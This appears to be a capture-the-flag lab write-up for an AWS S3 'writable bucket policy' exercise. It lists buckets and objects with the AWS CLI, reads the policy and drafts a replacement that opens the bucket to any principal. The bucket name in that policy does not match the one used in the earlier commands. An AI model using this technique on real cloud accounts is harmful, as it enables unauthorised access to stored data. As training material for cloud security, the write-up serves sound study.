# Writable Bucket Policy

Check S3 buckets. `aws s3api list-buckets --profile PTAcademyJllerena`

![image](https://user-images.githubusercontent.com/46797181/227658505-42416859-b7c1-4f99-befd-0c2f5cff5f57.png)

Check objects present in S3 bucket. `aws s3api list-objects --bucket s3-writable-policy-147461436620 --profile PTAcademyJllerena`
![image](https://user-images.githubusercontent.com/46797181/227658680-712f83da-a531-4e15-9f8a-1b0dac580a44.png)

Trying to download the flag will give a forbidden permission. Lets check bucket policy
```
aws s3 cp s3://s3-writable-policy-147461436620/flag ./ --profile PTAcademyJllerena
aws s3api get-bucket-policy --bucket s3-writable-policy-147461436620 --output text --profile PTAcademyJllerena | jq
```
![image](https://user-images.githubusercontent.com/46797181/227659776-294ab081-3256-4b70-9f46-d25eff6e1b64.png)

The policy allows to put bucket policy. Create a file to update the policy.

```
{
  "Statement": [
  {
    "Action": [
     "s3:GetBucketPolicy",
     "s3:PutBucketPolicy"
    ],
    "Effect": "Allow",
    "Principal": {
     "AWS": "*"
    },
    "Resource": "arn:aws:s3:::s3-writable-policy-157363981057"
  },
   {
     "Action": "s3:*",
     "Effect": "Allow",
     "Principal": {
     "AWS": "*"
     },
     "Resource": "arn:aws:s3:::s3-writable-policy-157363981057/*"
    }
  ],
  "Version": "2012-10-17"
}
```





















